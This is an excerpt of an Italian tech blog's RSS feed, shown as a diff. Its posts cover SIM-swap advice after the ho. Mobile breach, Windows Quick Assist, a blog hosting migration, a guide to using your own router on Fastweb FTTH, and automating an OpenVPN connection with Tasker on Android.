+&lt;p>Perché è improbabile che accada a noi a causa di questo breach? Perché questo tipo di attacco non può essere scalato velocemente su due milioni e mezzo di utenti, come potrebbe esserlo un furto di account di mail. Richiede l’intervento di un provider telefonico compiacente che effettua la portabilità senza verifica di un documento d’identità. È una tipologia di attacco mirato nei nostri confronti. Insomma, qualcuno che ha pescato da un mazzo di due milioni di carte, proprio la nostra.&lt;/p>
+&lt;h3 id="per-quanto-riguarda-la-protezione-da-sim-swapping-posso-fare-qualcosa-">
+Per quanto riguarda la protezione da SIM swapping, posso fare qualcosa? 📴
+&lt;a href="#per-quanto-riguarda-la-protezione-da-sim-swapping-posso-fare-qualcosa-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Per arginare questa pratica illecita la soluzione più facile è quella di richiedere la sostituzione della SIM presso i punti vendita &amp;ldquo;ho. Mobile&amp;rdquo; autorizzati. &lt;a href="https://sendy.logotel.it/l/K64763I7GOqtsi7Z892fEC2xUQ/kUMXOcASt1oDsw8FbacaDw/ctbpaBfqUDNAywODAY9cTg">https://www.ho-mobile.it/trova-negozio.html&lt;/a>&lt;/p>
+&lt;h3 id="non-mi-fido-più-di-ho-mobile-posso-cambiare-operatore-">
+Non mi fido più di &amp;ldquo;ho. Mobile&amp;rdquo;. Posso cambiare operatore? 📶
+&lt;a href="#non-mi-fido-pi%c3%b9-di-ho-mobile-posso-cambiare-operatore-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Sì, ma farlo ora è sconsigliato perché la procedura potrebbe non andare a buon fine. Stanno arrivando segnalazioni di utenti che stanno ricevendo esito negativo della loro richiesta di portabilità. È probabile che &amp;ldquo;ho. Mobile&amp;rdquo; abbia temporaneamente bloccato le portabilità verso altro operatore per arginare il problema del SIM swapping. Se non vi sentite sicuri, vi consiglio temporaneamente di cambiare SIM e quando la situazione si sarà calmata, procedere al cambio di operatore.&lt;/p></description></item><item><title>Assistenza Rapida con Windows 10</title><link>/post/assistenza-rapida-con-windows-10/</link><pubDate>Fri, 01 May 2020 22:47:12 +0000</pubDate><guid>/post/assistenza-rapida-con-windows-10/</guid><description>
+&lt;img src="/images/4dbc0be0702fce0f625b06e1c4d3d8f403405893.webp"/>
+&lt;p>Windows 10 integra di base un comodo strumento per poter offrire assistenza remota, senza dover scaricare software di terze parti come i più famosi TeamViewer o AnyDesk.&lt;/p>
+&lt;p>Il software in questione si chiama proprio &lt;strong>Assistenza Rapida&lt;/strong>, ed è facilmente raggiungibile dal menu &lt;strong>Start&lt;/strong> nella cartella &lt;strong>Accessori Windows&lt;/strong> e cliccando su &lt;strong>Assistenza rapida&lt;/strong>, oppure cliccando il pulsante &lt;strong>Start&lt;/strong> e digitando &lt;strong>Assistenza rapida&lt;/strong> nella casella di ricerca.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/immagine-1.png" />
+&lt;figcaption class="center" >Assistenza Rapida nel menu Start&lt;/figcaption>
+&lt;/figure>
+&lt;h3 id="come-funziona">
+Come funziona?
+&lt;a href="#come-funziona" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Lo strumento è estremamente semplice: chi offre assistenza clicca su &lt;strong>Aiuta un&amp;rsquo;altra persona&lt;/strong>, generando così un codice da inviare alla persona da aiutare. Questa persona inserisce il codice nel campo &lt;strong>Codice dall&amp;rsquo;assistente&lt;/strong> e nel giro di pochi clic è possibile vedere il PC remoto o prenderne il controllo, a seconda dei permessi concessi.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/immagine-2.png" />
+&lt;figcaption class="center" >Finestra di Assistenza Rapida&lt;/figcaption>
+&lt;/figure>
+&lt;p>Personalmente l&amp;rsquo;ho utilizzato in diverse occasioni e l&amp;rsquo;ho trovato molto pratico, soprattutto per abbattere i tempi morti iniziali, spesso causati dal dover spiegare a persone non tecnicamente brillanti come scaricare correttamente il software di assistenza da internet.&lt;/p>
+&lt;p>Quante volte hanno &amp;ldquo;aperto Google&amp;rdquo; e alla fine non era Google?&lt;/p>
+&lt;p>Ecco, ci siamo capiti.&lt;/p></description></item><item><title>Nuova casa per il blog</title><link>/post/nuova-casa-per-il-blog/</link><pubDate>Sun, 23 Feb 2020 14:22:51 +0000</pubDate><guid>/post/nuova-casa-per-il-blog/</guid><description>
+&lt;img src="/images/plattform-hetzner-cloud.svg"/>
+&lt;p>In una sera di noia, ho trasferito questo blog e il dominio su una nuova infrastruttura per ottimizzare la gestione e i costi.&lt;/p>
+&lt;p>Come avevo scritto tempo fa, la macchina che ospitava il blog era una piccola EC2 t2.micro su AWS, mentre il dominio era registrato su Route 53.&lt;/p>
+&lt;p>Ben presto mi sono reso conto che AWS non è per nulla economico e i costi sono anche imprevendibili, perché ogni risorsa viene calcolata in modo preciso in base all&amp;rsquo;uso. Se si ha tanto traffico, si paga di più perché le risorse computazionali e di data transfer sono superiori. A questi livelli il delta è di un paio di euro al massimo, ma è comunque fastidioso per uno spazio di cazzeggio personale.&lt;/p>
+&lt;p>Con il setup su AWS, questo blog mi costava circa 14€ al mese, sommando EC2, transfer e zona DNS di Route53.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/2020-02-23-14_49_48-Billing-Management-Console.png" />
+&lt;/figure>
+&lt;p>Ho mantenuto questa situazione per tanto tempo, a causa della mia inestimabile pigrizia. Il mio obiettivo principale era quello di migrare Ghost ad un CMS statico, ma dopo mesi di ricerca non sono ancora riuscito a trovare un setup pratico che mi abbia convinto ad abbandonare Ghost.&lt;/p>
+&lt;p>Preso in un momento di buona produttività, ho abbandonato temporaneamente l&amp;rsquo;idea di staticizzare il blog e mi sono messo d&amp;rsquo;impegno almeno per migrarlo ad un servizio più economico: ho creato su &lt;a href="https://www.hetzner.com/cloud">Hetzner&lt;/a> un VPS, in pochi minuti ho tirato su un Ghost pulito, import del backup in JSON dal vecchio blog, import della cartella dei media, cambio dei DNS e in poco più di un&amp;rsquo;oretta avevo il blog up &amp;amp; running su una nuova macchina, il cui costo è di 3.65€ al mese.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/2020-02-23-14_51_51-Microsoft-Store.png" />
+&lt;/figure>
+&lt;p>Il passaggio successivo è stata la migrazione del dominio, per smettere di pagare 0.50$ al mese di zona DNS di Route53.&lt;/p>
+&lt;p>Avendo un TLD poco comune, sono andato su &lt;a href="https://tld-list.com">tld-list.com&lt;/a> e ho ordinato per transfer e renew più economici.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/2020-02-23-15_01_31-Cheapest-.tips-Domain-Registration--Renewal--Transfer-Prices-_-TLD-List.png" />
+&lt;/figure>
+&lt;p>Detto fatto, anche qui in meno di mezz&amp;rsquo;ora ho effettuato il transfer del dominio da Route53 a Porkbun 🐷. (tra l&amp;rsquo;altro è davvero figo porkbun, esperienza ottima!)&lt;/p>
+&lt;p>Al termine, ho eliminato tutti i servizi attivi su AWS. 👋🏻&lt;/p>
+&lt;p>Next step: staticizzare il blog e azzerare i costi, ma per quello vedremo più avanti&amp;hellip;&lt;/p></description></item><item><title>Fastweb FTTH e Modem Libero</title><link>/post/fastweb-e-modem-libero/</link><pubDate>Wed, 03 Apr 2019 21:02:50 +0000</pubDate><guid>/post/fastweb-e-modem-libero/</guid><description>
+&lt;img src="/images/thomas-jensen-602189-unsplash.webp"/>
+&lt;p>&lt;strong>AGGIORNAMENTO del 01/03/2020&lt;/strong>&lt;/p>
+&lt;p>Questo articolo è stato scritto diversi mesi fa. Potrebbe non essere più attuale e potrebbe consigliare procedure non più attuabili con i nuovi router e le nuove attivazioni Fastweb.&lt;/p>
+&lt;p>&lt;strong>ARTICOLO ORIGINALE&lt;/strong>&lt;/p>
+&lt;p>Con l’entrata in vigore della delibera AGCOM n. 348/18/CONS sul modem libero, gli operatori di rete fissa sono stati obbligati a rilasciare tutti i parametri relativi alla corretta configurazione di un modem alternativo a quello fornito dall&amp;rsquo;operatore.&lt;/p>
+&lt;p>Purtroppo la realtà dei fatti è che non tutti gli operatori hanno risposto in modo efficiente. Tra questi c&amp;rsquo;è Fastweb che ha interpretato &amp;ldquo;a modo suo&amp;rdquo; la delibera, soprattutto in ambito FTTH.&lt;/p>
+&lt;p>Se andiamo a leggere nella &lt;a href="https://www.fastweb.it/adsl-fibra-ottica/dettagli/altri-modem/">pagina dedicata alla delibera&lt;/a> sul sito di Fastweb, si legge:&lt;/p>
+&lt;blockquote>
+&lt;p>Nel caso di &lt;strong>Fibra&lt;/strong>, l&amp;rsquo;apparato scelto dal cliente alternativo al FASTGate deve essere collegato alla terminazione ottica (ONT) fornita da Fastweb mediante un cavo di rete Ethernet Categoria 5e o superiore alla porta WAN Ethernet.&lt;/p>
+&lt;/blockquote>
+&lt;p>Insomma, non proprio chiarissimo. Ma soprattutto, se oggi prendete il vostro bel cavo in fibra ottica, prendete il vostro modem router e lo collegate al posto del FASTGate fornito da Fastweb, usando solo le informazioni riportate sul sito, il risultato è che non succede proprio nulla.&lt;/p>
+&lt;p>&lt;strong>Fastweb ha mentito? Non direi&lt;/strong>. Diciamo che ha omesso tipo quelle due o tre informazioni utili a far funzionare il tutto. Nel momento in cui vi scrivo infatti è possibile usare un router alternativo al FASTGate, a patto di spendere qualche soldino e rispettare un po&amp;rsquo; di requisiti tecnici.&lt;/p>
+&lt;h2 id="requisiti">
+Requisiti
+&lt;a href="#requisiti" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Partiamo da quel poco che ci dice Fastweb, ovvero che &lt;em>&amp;ldquo;l&amp;rsquo;apparato [&amp;hellip;] deve essere collegato alla terminazione ottica (ONT) [&amp;hellip;] con un cavo di rete [&amp;hellip;] alla porta WAN&amp;rdquo;&lt;/em>.&lt;/p>
+&lt;p>L&amp;rsquo;ONT fornita da Fastweb è quella piccola terminazione di metallo che collega il cavo in fibra ottica direttamente al router.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/IMG_20190403_224147.resized.jpg" />
+&lt;/figure>
+&lt;p>Questo piccolo stick è un trasmettitore che invia e riceve segnali luminosi sulla fibra ottica e li trasforma in impulsi elettrici, interpretabili dal router. L&amp;rsquo;ONT va collegato alla porta WAN del router con un cavo di rete, quindi&amp;hellip; serve un &lt;strong>convertitore&lt;/strong>!&lt;/p>
+&lt;h3 id="tp-link-mediaconverter-mc220l">
+TP-Link MediaConverter MC220L
+&lt;a href="#tp-link-mediaconverter-mc220l" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>L&amp;rsquo;MC220L di TP-Link è attualmente il miglior MediaConverter che potete acquistare per questo caso d&amp;rsquo;uso. Il costo è inferiore ai 30 euro.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/image-1.png" />
+&lt;figcaption class="center" >TP-Link MediaConverter MC220L&lt;/figcaption>
+&lt;/figure>
+&lt;p>È un dispositivo abbastanza stupido nel suo funzionamento. Ha due porte: in una ci mettete la ONT di Fastweb, nell&amp;rsquo;altra ci mettete il cavo di rete che va al vostro router. Fine. Non ha setup, non ha IP, non ha pagine di configurazioni.&lt;/p>
+&lt;p>Secondo Fastweb, dovrebbe essere finita qui (lol). In pratica, manca un enorme dettaglio, ovvero quali parametri inserire nella porta WAN del router che andremo ad usare.&lt;/p>
+&lt;h3 id="scelta-del-router">
+Scelta del router&amp;hellip;
+&lt;a href="#scelta-del-router" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Se state già pensando di usare il vostro Netgear di 10 anni fa o il TP-Link da 15 euro comprato al Black-Friday, scordatevelo! &lt;strong>Il primo requisito&lt;/strong> del router da usare per sostituire il FASTGate è che sia &lt;strong>performante&lt;/strong>, perché deve essere in grado di gestire un traffico NAT WAN-to-LAN di 1Gbps.&lt;/p>
+&lt;p>Ebbene sì, benvenuti nel magico mondo delle connessioni domestiche ultra-veloci, dove anche in casa servono router carrozzati e performanti per poter sfruttare tutta la banda offerta dal provider.&lt;/p>
+&lt;p>Se volete sapere a grandi linee le performance del router che avete o che volete acquistare, potete fare riferimento a questa tabella comparativa di SmallNetBuilder:&lt;/p>
+&lt;p>&lt;a href="https://www.smallnetbuilder.com/tools/charts/router/bar/179-wan-to-lan-tcp/35">https://www.smallnetbuilder.com/tools/charts/router/bar/179-wan-to-lan-tcp/35&lt;/a>&lt;/p>
+&lt;p>Questo però non è l&amp;rsquo;unico requisito che il router deve rispettare. Ce n&amp;rsquo;è un altro, che è fondamentale.&lt;/p>
+&lt;h3 id="con-supporto-dhcp-option-60-sulla-wan">
+&amp;hellip;con supporto dhcp option 60 sulla WAN
+&lt;a href="#con-supporto-dhcp-option-60-sulla-wan" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Per sostituire il FASTGate con un router qualsiasi e far sì che funzioni, quest&amp;rsquo;ultimo deve &amp;ldquo;annunciarsi&amp;rdquo; come se fosse il FASTGate. Per fare questa cosa, occorre impostare alcuni &lt;strong>parametri personalizzati&lt;/strong> nel dhcp-client della WAN, ovvero il servizio che richiede l&amp;rsquo;IP al provider in fase di connessione.&lt;/p>
+&lt;p>Nello specifico il parametro da configurare è l&amp;rsquo;Option 60 &lt;code>vendor-class-identifier&lt;/code> del dhcp.&lt;/p>
+&lt;p>Ecco, questa non è una cosa proprio diffusa. È difficile trovare dei router ad uso consumer con questa opzione configurabile. In genere tutto ciò che è basato su OpenWRT e similari e/o ha una CLI, ha la possibilità di abilitare questo parametro. Non vorrei dirvi una stupidata ma gli ultimissimi Netgear consumer di fascia alta (300+ euro) dovrebbero supportare questi parametri, ma non fidatevi di me. Verificate.In genere queste opzioni sono facilmente configurabili su router SOHO/professionali tipo MikroTik, Ubiquiti EdgeRouter, tutto ciò che è basato su OpenWRT, pfSense, etc&amp;hellip;&lt;/p>
+&lt;h3 id="recap-dei-requisiti">
+Recap dei requisiti
+&lt;a href="#recap-dei-requisiti" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Quindi, punto elenco rapido di quello che serve:&lt;/p>
+&lt;ul>
+&lt;li>Un MediaConverter per collegare la ONT originale fornita da Fastweb&lt;/li>
+&lt;li>Un router performante&amp;hellip;&lt;/li>
+&lt;li>&amp;hellip;che supporti la dhcp option 60 (vendor class identifier) sulla WAN&lt;/li>
+&lt;/ul>
+&lt;p>Detto ciò, vediamo nel concreto.&lt;/p>
+&lt;h2 id="tempo-di-spendere-soldi-e-collegare-due-cavi">
+Tempo di spendere soldi e collegare due cavi
+&lt;a href="#tempo-di-spendere-soldi-e-collegare-due-cavi" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Per il mio setup ho scelto di riciclare un vecchio Ubiquiti EdgeRouter-Lite che avevo nel cassetto. Per mia fortuna è un router che supporta tutti i parametri che servono e grazie all&amp;rsquo;accelerazione hardware riesce tranquillamente a gestire un throughput di 1 Gbps. Non ha il WiFi, ma per quello avevo già intenzione di prendermi un UniFi nanoHD, che per l&amp;rsquo;occasione ho acquistato insieme al MediaConverter.&lt;/p>
+&lt;p>
+&lt;figure class="center" >
+&lt;img src="/images/MVIMG_20190329_132819.resized.jpg" />
+&lt;/figure>
+&lt;figure class="center" >
+&lt;img src="/images/MVIMG_20190329_132649.resized.jpg" />
+&lt;/figure>
+&lt;/p>
+&lt;h3 id="colleghiamo-i-cavi">
+Colleghiamo i cavi
+&lt;a href="#colleghiamo-i-cavi" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Iniziamo quindi a &lt;strong>sfilare l&amp;rsquo;ONT dal FASTGate&lt;/strong>. Prima di procedere con questa operazione, vi consiglio di spegnere il router e lasciarlo spento per qualche minuto. L&amp;rsquo;ONT infatti si &lt;strong>surriscalda molto&lt;/strong> e c&amp;rsquo;è il rischio di scottarsi durante le operazioni.&lt;/p>
+&lt;p>Ricollegate quindi il tutto nel MediaConverter. Prima di collegare il cavo di rete al router però, dobbiamo configurare i parametri sulla WAN.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/IMG_20190403_000923.resized.jpg" />
+&lt;/figure>
+&lt;h3 id="impostare-i-parametri-sulla-wan-del-router">
+Impostare i parametri sulla WAN del router
+&lt;a href="#impostare-i-parametri-sulla-wan-del-router" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>&lt;strong>La prima cosa da fare&lt;/strong> è impostare l&amp;rsquo;interfaccia in modalità DHCP, in modo da prendersi automaticamente l&amp;rsquo;IP dal provider in fase di connessione. Questo è un setup praticamente standard che hanno tutti i router.&lt;/p>
+&lt;p>&lt;strong>La seconda cosa da fare&lt;/strong> è clonare il MAC address del FASTGate. Il MAC Address è scritto sulla destra di un&amp;rsquo;etichetta dietro il FASTGate.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/MVIMG_20190403_203840.resized.jpg" />
+&lt;/figure>
+&lt;p>Per impostare il MAC sulla WAN nel EdgeRouter è possibile farlo da CLI, oppure andando nella tab Config Tree dell&amp;rsquo;interfaccia web e navigare fino a &lt;code>interfaces / ethernet / eth0&lt;/code>, inserendo poi il MAC nell&amp;rsquo;apposito campo, facendo attenzione ad inserirlo nel formato &lt;code>00:00:00:00:00:00&lt;/code>.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/Schermata-da-2019-04-03-20-50-46_450112b1995490a1e086956374eb0845.png" />
+&lt;/figure>
+&lt;p>Confermate la configurazione con &lt;code>Preview&lt;/code> e &lt;code>Apply&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>La terza cosa da fare&lt;/strong> è impostare il parametro DHCP Option 60. Per impostarlo possiamo sempre andare da CLI, oppure anche qui possiamo modificare le proprietà dal &lt;strong>Config Tree&lt;/strong>. Navighiamo fino a &lt;code>interfaces / ethernet / eth0 / dhcp-options&lt;/code> e nel campo &lt;strong>client-option&lt;/strong> dobbiamo inserire questa stringa esatta:&lt;/p>
+&lt;p>&lt;code>send vendor-class-identifier &amp;amp;quot;askey_HW_ES1_SW_0.00.67/dslforum.org&amp;amp;quot;;&lt;/code>&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/Schermata-da-2019-04-03-20-56-57_2e6aafa7f4b30c73220b551db0b42e5a.png" />
+&lt;/figure>
+&lt;p>Confermate sempre con &lt;code>Preview&lt;/code> e &lt;code>Apply&lt;/code>.&lt;/p>
+&lt;p>&lt;strong>NOTA IMPORTANTE&lt;/strong>: la stringa esatta da inserire dovrebbe essere &lt;code>send vendor-class-identifier &amp;quot;askey_HW_ES1_SW_0.00.67/dslforum.org&amp;quot;;&lt;/code> tuttavia l&amp;rsquo;EdgeRouter restituisce un errore se si usano gli &amp;quot; nella stringa, quindi li ho sostituiti con &lt;code>&amp;amp;quot;&lt;/code>.&lt;/p>
+&lt;p>A questo punto, dovrebbe essere tutto pronto.&lt;/p>
+&lt;h3 id="test-drive">
+Test Drive
+&lt;a href="#test-drive" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Colleghiamo il cavo di rete alla porta WAN del nostro router.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/IMG_20190403_001118.resized.jpg" />
+&lt;/figure>
+&lt;p>I LED sul MediaConverter dovrebbero accendersi e nel giro di qualche secondo il router dovrebbe effettuare la connessione.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/Schermata-da-2019-03-31-16-02-01.resized.jpg" />
+&lt;figcaption class="center" >Connected! Velocità di download molto vicina alla nominale da contratto.&lt;/figcaption>
+&lt;/figure>
+&lt;p>Fate un test di navigazione e se avete fatto tutto correttamente dovrebbe funzionare tutto!&lt;/p>
+&lt;p>A questo punto potete prendere il vostro FASTGate e fargli fare la fine che merita&amp;hellip;&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/MVIMG_20190331_180053.resized.jpg" />
+&lt;/figure>
+&lt;h2 id="conclusioni">
+Conclusioni
+&lt;a href="#conclusioni" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Come avete visto, sostituire il router fornito da Fastweb è possibile, tuttavia è un&amp;rsquo;operazione non alla portata di tutti. Richiede un hardware comunque al pari se non superiore al FASTGate (che tecnicamente schifo non fa) e un minimo di competenze tecniche e di networking per destreggiarsi tra collegamenti di rete e stringhe strane.&lt;/p>
+&lt;p>&lt;strong>A questo punto però, a molti di voi verrà spontanea una domanda: perché sostituire il router del provider con un router di proprietà? Cosa si guadagna? Il FASTGate non va bene?&lt;/strong>&lt;/p>
+&lt;p>Ebbene, non è tanto l&amp;rsquo;hardware il problema in questo caso, ma il software.&lt;/p>
+&lt;p>Il software che gestisce questi router infatti è sviluppato su misura dal provider stesso e generalmente è un&amp;rsquo;accozzaglia di codice scritto male e senza criterio. Come risultato si ottiene un firmware con poche funzioni, spesso basilari e quelle poche funzioni avanzate che ci sono hanno bug assurdi che ne compromettono il corretto funzionamento.&lt;/p>
+&lt;p>Un esempio? Il famoso caso di Destiny e il router &amp;ldquo;scolapasta&amp;rdquo; di TIM:&lt;br>
+&lt;a href="https://www.bungie.net/it/Forums/Post/242575705">https://www.bungie.net/it/Forums/Post/242575705&lt;/a>&lt;/p>
+&lt;p>&lt;strong>A questo punto qualcuno dirà&amp;hellip; vabbé ma io devo solo navigare sull&amp;rsquo;internetto, cosa me ne frega di tutto il resto? Non posso stare col mio bel router che collego e funziona?&lt;/strong>&lt;/p>
+&lt;p>Sì, certamente, però qui entriamo nel secondo problema di questi router, a parer mio il più grave e che riguarda praticamente il 100% degli utenti: la sicurezza e la privacy.&lt;/p>
+&lt;p>Come sicuramente saprete, questi router dei provider sono famosi per essere &lt;strong>telegestiti&lt;/strong>, ovvero il provider può tecnicamente entrare nel vostro router e apportare modifiche da remoto. Queste modifiche generalmente sono aggiornamenti firmware, e fin qui nulla di male, però non si limitano a questo: possono tecnicamente modificare il funzionamento del router, estrapolare informazioni e vedere quello che c&amp;rsquo;è all&amp;rsquo;interno della vostra rete domestica, vedere i vostri dispositivi, vedere se avete un iPhone, un Android, un Roomba, una telecamera, e così via.&lt;/p>
+&lt;p>Se si considera la rete locale come le quattro mura di casa, è come se il vostro fornitore del gas venisse a casa vostra a vedere cosa state cucinando sui fornelli tutte le sere. Non solo, volendo ha la possibilità di decidere arbitrariamente di regolarvi la potenza della fiamma. Non suona come una bella cosa, vero?&lt;/p>
+&lt;p>&lt;strong>Però anche qui, sono quasi certo che qualcuno dirà &amp;ldquo;è il mio provider, sono consapevole e non ho nulla da nascondere. Mi fido!&amp;rdquo;.&lt;/strong>&lt;/p>
+&lt;p>Ebbene, durante questa fase di setup del nuovo router mi sono accorto per puro caso che dal mio IP pubblico con il vecchio FASTGate risultava una &lt;strong>porta aperta in ingresso&lt;/strong> da internet. (Premessa per i neofiti: a meno di configurazioni particolari e volute, le porte in ingresso da internet devono essere assolutamente &lt;strong>chiuse&lt;/strong>!)&lt;/p>
+&lt;p>Verificando la configurazione del FASTGate non ho trovato alcuna traccia di una configurazione che citasse questa porta, né tanto meno che fosse aperta indiscriminatamente a tutti.&lt;/p>
+&lt;p>Al che mi è venuto un dubbio: se non fosse solo un mio problema?&lt;/p>
+&lt;p>Facendo una velocissima ricerca su &lt;strong>Shodan&lt;/strong>, ho scoperto di non essere solo. Cercando infatti per questa porta e isolando la ricerca sul suolo italiano, di quasi 59.000 risultati, &lt;strong>ben 44.000 sono di Fastweb&lt;/strong> con un nettissimo distacco dal secondo posto.&lt;/p>
+&lt;p>
+&lt;figure class="center" >
+&lt;img src="/images/Schermata-da-2019-04-03-22-10-17-1.png" />
+&lt;/figure>
+&lt;figure class="center" >
+&lt;img src="/images/Schermata-da-2019-04-03-22-10-39_2c33668b1461ab69de2885337110f5e9-2.png" />
+&lt;/figure>
+&lt;/p>
+&lt;p>Abbiamo quindi una situazione dove il router telegestito e controllato dal provider espone su internet un servizio del router non chiaramente identificato, aperto a tutti, in modo assolutamente silente, lasciando quindi il cliente ignaro della situazione di potenziale pericolo.&lt;/p>
+&lt;p>Il rischio, seppur remoto, è che qualcuno possa tentare di sfruttare delle potenziali vulnerabilità del servizio esposto, prendendo così il controllo dell&amp;rsquo;apparato e accedere così all&amp;rsquo;interno della vostra rete. Se mettiamo insieme anche il fatto che spesso il firmware di questi router è scritto coi piedi, il rischio di subire una violazione non sembra poi così remoto.&lt;/p>
+&lt;p>Ed ecco quindi che il provider, di cui vi fidate, può commettere degli errori e mettere in pericolo la vostra sicurezza e la vostra privacy.&lt;/p>
+&lt;p>Quindi, tornando alla domanda originale, perché sostituire il router del provider con un router proprietario?&lt;/p>
+&lt;p>La risposta è molto semplice:&lt;/p>
+&lt;p>&lt;strong>PRIVACY.&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>SICUREZZA.&lt;/strong>&lt;/p>
+&lt;p>&lt;strong>LIBERTÀ.&lt;/strong>&lt;/p></description></item><item><title>Automatizzare la connessione VPN con Tasker per Android</title><link>/post/automatizzare-la-connessione-vpn-con-tasker-per-android/</link><pubDate>Sun, 25 Nov 2018 17:19:34 +0000</pubDate><guid>/post/automatizzare-la-connessione-vpn-con-tasker-per-android/</guid><description>
+&lt;img src="/images/pihole1-1-1-.jpeg"/>
+&lt;p>Da quando ho iniziato ad usare le VPN sul telefono mi sono accorto di un problema di semplice natura: ricordarmi di attivarla quando esco di casa. Spesse volte mi è capitato infatti di ricordarmene solo dopo qualche ora passata fuori casa, o ancora peggio accorgermi della mancanza di un filtro sulla navigazione quando ormai avevo già vinto 4 iPad e 9 iPhone X.&lt;/p>
+&lt;p>L&amp;rsquo;idea mi è quindi balzata in testa: perché non automatizzare la connessione VPN appena mi allontano dal WiFi di casa? Viceversa, appena torno a casa la VPN si deve disconnettere.&lt;/p>
+&lt;p>Ebbene, grazie a Tasker e il client OpenVPN for Android è possibile farlo!&lt;/p>
+&lt;p>Questa breve guida fa seguito alla mia guida iniziale su &lt;a href="__GHOST_URL__/virtual-private-pi-holed-network/">come realizzare una VPN domestica con Pi-Hole integrato&lt;/a> da poter utilizzare fuori casa per navigare sicuri e protetti in mobilità.&lt;/p>
+&lt;h2 id="tasker-per-android">
+Tasker per Android
+&lt;a href="#tasker-per-android" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Tasker è un&amp;rsquo;app per Android che permette di eseguire delle automazioni in base a determinate condizioni. La trovate nel &lt;a href="https://play.google.com/store/apps/details?id=net.dinglisch.android.taskerm">Play Store&lt;/a> ad un costo di 2.99 €.&lt;/p>
+&lt;p>Il principio di funzionamento di Tasker è molto semplice:&lt;/p>
+&lt;p>&lt;strong>SE&lt;/strong> [CONDIZIONE DA RISPETTARE] &lt;strong>È VERO, ALLORA&lt;/strong> [ESEGUI ATTIVITÀ]&lt;/p>
+&lt;p>In Tasker le &amp;ldquo;condizioni da rispettare&amp;rdquo; si chiamano &lt;strong>Profili&lt;/strong>. Ogni &lt;strong>Attività&lt;/strong> può contenere una o più &lt;strong>Azioni&lt;/strong>.&lt;/p>
+&lt;h2 id="automatic-virtual-private-pi-holed-network">
+AUTOMATIC Virtual Private Pi-Holed Network
+&lt;a href="#automatic-virtual-private-pi-holed-network" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>La logica con cui ho creato l&amp;rsquo;automazione è la seguente:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>SE&lt;/strong> [WiFi non connesso] &lt;strong>È VERO, ALLORA&lt;/strong> [Connetti VPN]&lt;/li>
+&lt;li>&lt;strong>SE&lt;/strong> [WiFi di casa connesso] &lt;strong>È VERO, ALLORA&lt;/strong> [Disconnetti VPN]&lt;/li>
+&lt;/ul>
+&lt;p>La realizzazione è abbastanza semplice, vediamola insieme.&lt;/p>
+&lt;h2 id="creiamo-le-attività-start-vpn-e-stop-vpn">
+Creiamo le attività &amp;ldquo;Start VPN&amp;rdquo; e &amp;ldquo;Stop VPN&amp;rdquo;
+&lt;a href="#creiamo-le-attivit%c3%a0-start-vpn-e-stop-vpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Iniziamo con la creazione delle due attività di connessione e disconnessione della VPN.&lt;/p>
+&lt;h3 id="start-vpn">
+Start VPN
+&lt;a href="#start-vpn" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Apriamo Tasker e posizioniamoci sulla tab &lt;strong>Attività&lt;/strong>, dopodiché premiamo &lt;strong>+&lt;/strong>, scriviamo &lt;strong>&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong> e poi confermiamo.&lt;/p>
+&lt;p>A questo punto possiamo andare ad inserire una o più azioni che verranno eseguite quando verrà avviata questa attività, noi dobbiamo connettere il nostro profilo VPN salvato in OpenVPN for Android.&lt;/p>
+&lt;p>Per farlo, premiamo &lt;strong>+&lt;/strong> e scegliamo &lt;strong>Sistema&lt;/strong> e &lt;strong>Invia Intent&lt;/strong>. Vi apparirà un form dove bisogna inserire dei valori. I valori da inserire sono questi:&lt;/p>
+&lt;p>Azione&lt;br>
+&lt;code>android.intent.action.MAIN&lt;/code>&lt;br>
+Cat&lt;br>
+&lt;code>None&lt;/code>&lt;br>
+Extra (dove &amp;ldquo;Casa&amp;rdquo; è il nome del vostro profilo VPN)&lt;br>
+&lt;code>de.blinkt.openvpn.shortcutProfileName: Casa&lt;/code>&lt;br>
+Pacchetto&lt;br>
+&lt;code>de.blinkt.openvpn&lt;/code>&lt;br>
+Classe&lt;br>
+&lt;code>de.blinkt.openvpn.LauchVPN&lt;/code>&lt;br>
+Target&lt;br>
+&lt;code>Activity&lt;/code>&lt;/p>
